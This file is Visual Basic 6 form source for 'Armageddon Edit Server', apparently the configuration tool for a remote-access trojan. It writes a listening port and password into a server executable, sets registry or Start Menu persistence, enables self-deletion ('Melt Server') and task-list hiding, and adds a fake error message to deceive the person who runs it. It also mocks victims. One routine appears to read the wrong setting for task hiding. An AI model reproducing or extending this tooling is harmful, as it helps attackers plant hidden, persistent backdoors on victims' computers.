VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmEdit 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Edit Server"
   ClientHeight    =   7920
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   5835
   Icon            =   "frmEdit.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7920
   ScaleWidth      =   5835
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame5 
      Caption         =   "Fake Error Message"
      Height          =   5115
      Left            =   60
      TabIndex        =   7
      Top             =   2760
      Width           =   5715
      Begin VB.CommandButton cmdCopy 
         Caption         =   "Save Copy"
         Height          =   315
         Left            =   3780
         TabIndex        =   36
         Top             =   4680
         Width           =   1275
      End
      Begin VB.CheckBox chkHide 
         Caption         =   "Hide From Task List (95/98/ME Only)"
         Height          =   195
         Left            =   2460
         TabIndex        =   35
         Top             =   360
         Width           =   2955
      End
      Begin VB.Frame Frame8 
         Caption         =   "Message"
         Height          =   1275
         Left            =   240
         TabIndex        =   23
         Top             =   3300
         Width           =   5175
         Begin VB.TextBox txtMessage 
            Height          =   315
            Left            =   1020
            MaxLength       =   200
            TabIndex        =   27
            Top             =   720
            Width           =   3915
         End
         Begin VB.TextBox txtTitle 
            Height          =   315
            Left            =   1020
            MaxLength       =   20
            TabIndex        =   25
            Top             =   360
            Width           =   1815
         End
         Begin VB.Label Label4 
            Caption         =   "Message:"
            Height          =   195
            Left            =   240
            TabIndex        =   26
            Top             =   780
            Width           =   675
         End
         Begin VB.Label Label3 
            Caption         =   "Title:"
            Height          =   195
            Left            =   540
            TabIndex        =   24
            Top             =   420
            Width           =   375
         End
      End
      Begin VB.CommandButton cmdSave 
         Caption         =   "Save Settings"
         Height          =   315
         Left            =   2220
         TabIndex        =   22
         Top             =   4680
         Width           =   1275
      End
      Begin VB.CommandButton cmdTest 
         Caption         =   "Test Message"
         Height          =   315
         Left            =   660
         TabIndex        =   21
         Top             =   4680
         Width           =   1275
      End
      Begin VB.Frame Frame7 
         Caption         =   "Buttons"
         Height          =   1155
         Left            =   240
         TabIndex        =   14
         Top             =   2100
         Width           =   5175
         Begin VB.OptionButton optButtons 
            Caption         =   "Yes/No"
            Height          =   195
            Index           =   5
            Left            =   3300
            TabIndex        =   20
            Top             =   720
            Width           =   1635
         End
         Begin VB.OptionButton optButtons 
            Caption         =   "Yes/No/Cancel"
            Height          =   195
            Index           =   4
            Left            =   1740
            TabIndex        =   19
            Top             =   720
            Width           =   1455
         End
         Begin VB.OptionButton optButtons 
            Caption         =   "Retry Cancel"
            Height          =   195
            Index           =   3
            Left            =   240
            TabIndex        =   18
            Top             =   720
            Width           =   1215
         End
         Begin VB.OptionButton optButtons 
            Caption         =   "Abort Retry Ignore"
            Height          =   195
            Index           =   2
            Left            =   3300
            TabIndex        =   17
            Top             =   360
            Width           =   1635
         End
         Begin VB.OptionButton optButtons 
            Caption         =   "OK && Cancel"
            Height          =   195
            Index           =   1
            Left            =   1740
            TabIndex        =   16
            Top             =   360
            Width           =   1215
         End
         Begin VB.OptionButton optButtons 
            Caption         =   "OK Only"
            Height          =   195
            Index           =   0
            Left            =   240
            TabIndex        =   15
            Top             =   360
            Value           =   -1  'True
            Width           =   915
         End
      End
      Begin VB.Frame Frame6 
         Caption         =   "Icon"
         Height          =   1395
         Left            =   240
         TabIndex        =   9
         Top             =   660
         Width           =   5175
         Begin VB.OptionButton optIcon 
            Caption         =   "Information"
            Height          =   195
            Index           =   3
            Left            =   3960
            TabIndex        =   13
            Top             =   900
            Width           =   1095
         End
         Begin VB.OptionButton optIcon 
            Caption         =   "Exclamation"
            Height          =   195
            Index           =   2
            Left            =   120
            TabIndex        =   12
            Top             =   900
            Value           =   -1  'True
            Width           =   1155
         End
         Begin VB.OptionButton optIcon 
            Caption         =   "Question"
            Height          =   195
            Index           =   1
            Left            =   1500
            TabIndex        =   11
            Top             =   900
            Width           =   975
         End
         Begin VB.OptionButton optIcon 
            Caption         =   "Critical"
            Height          =   195
            Index           =   0
            Left            =   2760
            TabIndex        =   10
            Top             =   900
            Width           =   795
         End
         Begin VB.Image imgIcon 
            Height          =   480
            Index           =   3
            Left            =   4260
            Picture         =   "frmEdit.frx":0442
            Top             =   360
            Width           =   480
         End
         Begin VB.Image imgIcon 
            Height          =   480
            Index           =   2
            Left            =   480
            Picture         =   "frmEdit.frx":0884
            Top             =   360
            Width           =   480
         End
         Begin VB.Image imgIcon 
            Height          =   480
            Index           =   1
            Left            =   1740
            Picture         =   "frmEdit.frx":0CC6
            Top             =   360
            Width           =   480
         End
         Begin VB.Image imgIcon 
            Height          =   480
            Index           =   0
            Left            =   2940
            Picture         =   "frmEdit.frx":1108
            Top             =   360
            Width           =   480
         End
      End
      Begin VB.CheckBox chkFake 
         Caption         =   "Enable/Disable"
         Height          =   195
         Left            =   240
         TabIndex        =   8
         Top             =   360
         Value           =   1  'Checked
         Width           =   1455
      End
   End
   Begin VB.Frame Frame4 
      Caption         =   "Startup Method"
      Height          =   1815
      Left            =   4020
      TabIndex        =   4
      Top             =   900
      Width           =   1755
      Begin VB.CheckBox chkMenu 
         Caption         =   "Start Menu"
         Height          =   195
         Left            =   240
         TabIndex        =   6
         Top             =   360
         Width           =   1155
      End
      Begin VB.CheckBox chkRegistry 
         Caption         =   "Registry Start"
         Height          =   195
         Left            =   240
         TabIndex        =   5
         Top             =   600
         Width           =   1275
      End
      Begin VB.Label Label5 
         Caption         =   "Registry startup is recommended. Only use 'Start Menu' on complete idiots"
         Height          =   795
         Left            =   120
         TabIndex        =   32
         Top             =   900
         Width           =   1515
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "Server Settings"
      Height          =   1815
      Left            =   60
      TabIndex        =   3
      Top             =   900
      Width           =   3915
      Begin VB.CheckBox chkDelete 
         Caption         =   "Melt Server"
         Height          =   195
         Left            =   2460
         TabIndex        =   37
         Top             =   1320
         Width           =   1155
      End
      Begin VB.TextBox txtKeyName 
         Height          =   315
         Left            =   180
         MaxLength       =   16
         TabIndex        =   33
         Top             =   1260
         Width           =   1815
      End
      Begin VB.TextBox txtPort 
         Height          =   315
         Left            =   2460
         MaxLength       =   5
         TabIndex        =   30
         Top             =   540
         Width           =   1095
      End
      Begin VB.TextBox txtPassword 
         Height          =   315
         Left            =   180
         MaxLength       =   16
         TabIndex        =   28
         Top             =   540
         Width           =   1815
      End
      Begin VB.Label Label7 
         Caption         =   "Key Name:"
         Height          =   195
         Left            =   180
         TabIndex        =   34
         Top             =   1020
         Width           =   795
      End
      Begin VB.Label Label1 
         Caption         =   "Port:"
         Height          =   195
         Left            =   2460
         TabIndex        =   31
         Top             =   300
         Width           =   375
      End
      Begin VB.Label Label2 
         Caption         =   "Password:"
         Height          =   195
         Left            =   180
         TabIndex        =   29
         Top             =   300
         Width           =   735
      End
   End
   Begin MSComDlg.CommonDialog cdgServer 
      Left            =   4680
      Top             =   240
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      Filter          =   "Executable Files|*.exe"
   End
   Begin VB.Frame Frame1 
      Caption         =   "Open Server File"
      Height          =   795
      Left            =   60
      TabIndex        =   0
      Top             =   60
      Width           =   5715
      Begin VB.CommandButton cmdSelect 
         Caption         =   "Open Server"
         Height          =   315
         Left            =   4320
         TabIndex        =   2
         Top             =   300
         Width           =   1095
      End
      Begin VB.TextBox txtOpen 
         Height          =   315
         Left            =   240
         Locked          =   -1  'True
         TabIndex        =   1
         Top             =   300
         Width           =   3975
      End
   End
End
Attribute VB_Name = "frmEdit"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'***************************************
'*    TITLE: ARMAGEDDON EDIT SERVER    *
'* PROGRAMMER: BARRY FRENCH A.K.A (EC) *
'*     USE WITH: ARMAGEDDON SERVER     *
'***************************************

Option Explicit

Dim bTask As Boolean
Dim bSkip As Boolean

'Disables or enables fake-message controls depending
'on wheather or not the check box is enabled
Private Sub EnableMessage(bFlag As Boolean)
Dim iCount As Integer

    For iCount = 0 To optIcon.UBound
        optIcon(iCount).Enabled = bFlag
    Next iCount
    
    For iCount = 0 To optButtons.UBound
        optButtons(iCount).Enabled = bFlag
    Next iCount
    
    txtTitle.Enabled = bFlag
    txtMessage.Enabled = bFlag
    
    If bFlag = False Then
        txtTitle.Text = "Disabled"
        txtMessage.Text = "Disabled"
        cmdTest.Enabled = False
    Else
        txtTitle.Text = ""
        txtMessage.Text = ""
        cmdTest.Enabled = True
    End If
End Sub

'Calls the EnableMessage function parsing a boolean
'value to enabled/disable the fake-message controls
Private Sub chkFake_Click()
    If chkFake.Value = vbChecked Then
        EnableMessage True
    Else
        EnableMessage False
    End If
End Sub

'Displays confirmation message if vbYes then check the checkbox
Private Sub chkHide_Click()
    If bTask = False Then

        If chkHide.Value = vbChecked Then
    
            If MsgBox("WARNING: Enabling this for operating systems other than Windows " & _
                "95/98/ME will cause a fatal error" & vbCrLf & vbCrLf & "Are you sure " & _
                "you wish to continue?", vbYesNo + vbExclamation, "Confirm") = vbYes Then
            
                chkHide.Value = vbChecked
            
            Else
                chkHide.Value = vbUnchecked
            End If
        
        End If
    
    End If
End Sub

'Calls the function to save the servers custom information as a copy
Private Sub cmdCopy_Click()
On Error GoTo Err

Dim sFileTemp As String
    
    bSkip = True
    
    sFileTemp = cdgServer.FileName
    
    With cdgServer
        .CancelError = True
        .ShowSave
    End With

    If SaveCopy(sFileTemp, cdgServer.FileName) = False Then GoTo Err
    
    cmdSave_Click
    
    bSkip = False
    
    Exit Sub
    
Err:
    If Err.Number = 32755 Then Exit Sub
    
    MsgBox "Could not save copy, check you have enough free space" _
        , vbExclamation + vbOKOnly, "Copy Error"
End Sub

'Saves the servers custom information into itself
Private Sub cmdSave_Click()
Dim lIcon As Long
Dim lButtons As Long

Dim sTitle As String
Dim sMessage As String
    
    If bSkip = True Then GoTo Skip
    
    If MsgBox("This will overwrite the server with the specified information" & _
        vbCrLf & "Do you wish to continue?", vbYesNo + vbQuestion, "Continue") = vbYes Then
    
Skip:
        MeEnable False

        If OpenFile(cdgServer.FileName) = False Then GoTo Err
    
        If ClearFile(1, cdgServer.FileName) = False Then GoTo Err
        If WritePort(1, txtPort.Text) = False Then GoTo Err
        If WritePassword(1, txtPassword.Text) = False Then GoTo Err
    
        If chkMenu.Value = vbUnchecked And chkRegistry.Value = vbUnchecked Then
            If WriteStartMethod(1, 0) = False Then GoTo Err
        End If
    
        If chkMenu.Value = vbChecked And chkRegistry.Value = vbUnchecked Then
            If WriteStartMethod(1, 2) = False Then GoTo Err
        End If
    
        If chkRegistry.Value = vbChecked And chkMenu.Value = vbUnchecked Then
            If WriteStartMethod(1, 1) = False Then GoTo Err
        End If
    
        If chkRegistry.Value = vbChecked And chkMenu.Value = vbChecked Then
            If WriteStartMethod(1, 3) = False Then GoTo Err
        End If
    
        If chkRegistry.Value = vbChecked Then
            If WriteKeyName(1, txtKeyName.Text) = False Then GoTo Err
        Else
            If WriteKeyName(1, "") = False Then GoTo Err
        End If
    
        If chkDelete.Value = vbChecked Then
            If WriteMelt(1, True) = False Then GoTo Err
        Else
            If WriteMelt(1, False) = False Then GoTo Err
        End If
    
        If chkHide.Value = vbChecked Then
            If WriteTask(1, True) = False Then GoTo Err
        Else
            If WriteTask(1, False) = False Then GoTo Err
        End If
    
        If chkFake.Value = vbChecked Then
    
            If optIcon(0).Value = True Then lIcon = 16
            If optIcon(1).Value = True Then lIcon = 32
            If optIcon(2).Value = True Then lIcon = 48
            If optIcon(3).Value = True Then lIcon = 64
    
            If optButtons(0).Value = True Then lButtons = 0
            If optButtons(1).Value = True Then lButtons = 1
            If optButtons(2).Value = True Then lButtons = 2
            If optButtons(3).Value = True Then lButtons = 5
            If optButtons(4).Value = True Then lButtons = 3
            If optButtons(5).Value = True Then lButtons = 4
        
            sTitle = txtTitle.Text
            sMessage = txtMessage.Text
        
            If WriteMessage(1, lIcon, lButtons, sTitle, sMessage) = False Then GoTo Err
        
        End If
    
        If CloseFile(1) = False Then GoTo Err
    
        MeEnable True
    
    End If
    
    Exit Sub
    
Err:
    MsgBox "Unexpected error occured. File may not be selected" & _
        vbCrLf & vbCrLf & "Make sure the selected file is a valid Armageddon " & _
        "Server file", vbExclamation, "Error"
End Sub

Private Sub cmdSelect_Click()
Dim lButtons As Long
Dim lIcon As Long

Dim sTitle As String
Dim sMessage As String

    cdgServer.ShowOpen
    
    If cdgServer.FileName = "" Then Exit Sub
    
    MeEnable False
    
    txtOpen.Text = cdgServer.FileName
    
    With Me
        .Height = 8295
        .Top = (Screen.Height / 2) - (.Height / 2)
        .Left = (Screen.Width / 2) - (.Width / 2)
    End With
    
    txtPort.Text = FindPort
    txtPassword.Text = FindPassword
    
    Select Case FindStartMethod
    
        Case 1
        chkRegistry.Value = vbChecked
        chkMenu.Value = vbUnchecked
        
        Case 2
        chkRegistry.Value = vbUnchecked
        chkMenu.Value = vbChecked
        
        Case 3
        chkRegistry.Value = vbChecked
        chkMenu.Value = vbChecked
        
    End Select
    
    txtKeyName.Text = FindKeyName
    
    If FindMelt = True Then
        chkDelete.Value = vbChecked
    Else
        chkDelete.Value = vbUnchecked
    End If
    
    bTask = True
    
    If FindMelt = True Then
        chkHide.Value = vbChecked
    Else
        chkHide.Value = vbUnchecked
    End If
    
    bTask = False
    
    If FindMessage(lIcon, lButtons, sTitle, sMessage) = True Then
        
        If lIcon = 16 Then optIcon(0).Value = True
        If lIcon = 32 Then optIcon(1).Value = True
        If lIcon = 48 Then optIcon(2).Value = True
        If lIcon = 64 Then optIcon(3).Value = True
        
        If lButtons = 0 Then optButtons(0).Value = True
        If lButtons = 1 Then optButtons(1).Value = True
        If lButtons = 2 Then optButtons(2).Value = True
        If lButtons = 3 Then optButtons(4).Value = True
        If lButtons = 4 Then optButtons(5).Value = True
        If lButtons = 5 Then optButtons(3).Value = True
        
        txtTitle.Text = sTitle
        txtMessage.Text = sMessage
    Else
        chkFake.Value = vbUnchecked
    End If
        
    MeEnable True
End Sub

Private Sub cmdTest_Click()
Dim lButtons As Long
Dim lIcon As Long

Dim sTitle As String
Dim sMessage As String

    If optIcon(0).Value = True Then lIcon = 16
    If optIcon(1).Value = True Then lIcon = 32
    If optIcon(2).Value = True Then lIcon = 48
    If optIcon(3).Value = True Then lIcon = 64
    
    If optButtons(0).Value = True Then lButtons = 0
    If optButtons(1).Value = True Then lButtons = 1
    If optButtons(2).Value = True Then lButtons = 2
    If optButtons(3).Value = True Then lButtons = 5
    If optButtons(4).Value = True Then lButtons = 3
    If optButtons(5).Value = True Then lButtons = 4
    
    sTitle = txtTitle.Text
    sMessage = txtMessage.Text
    
    MsgBox sMessage, lButtons + lIcon, sTitle
End Sub

Private Sub Form_Load()
    Me.Height = 1275
End Sub

Private Sub TextSel(txtBox As TextBox)
    With txtBox
        .SelStart = 0
        .SelLength = Len(.Text)
    End With
End Sub

Private Sub txtKeyName_GotFocus()
    TextSel txtKeyName
End Sub

Private Sub txtMessage_GotFocus()
    TextSel txtMessage
End Sub

Private Sub txtOpen_GotFocus()
    TextSel txtOpen
End Sub

Private Sub txtPassword_GotFocus()
    TextSel txtPassword
End Sub

Private Sub txtPort_GotFocus()
    TextSel txtPort
End Sub

Private Sub txtPort_KeyPress(KeyAscii As Integer)
    If KeyAscii = 8 Then Exit Sub
    
    If KeyAscii < 48 Or KeyAscii > 57 Then KeyAscii = 0
End Sub

Private Sub txtTitle_GotFocus()
    TextSel txtTitle
End Sub

Private Sub MeEnable(bEnable As Boolean)
    If bEnable = True Then
        Me.Enabled = True
        Me.MousePointer = 0
        Me.Caption = "Edit Server"
    Else
        Me.Enabled = False
        Me.MousePointer = 11
        Me.Caption = "Edit Server - Working..."
    End If
End Sub
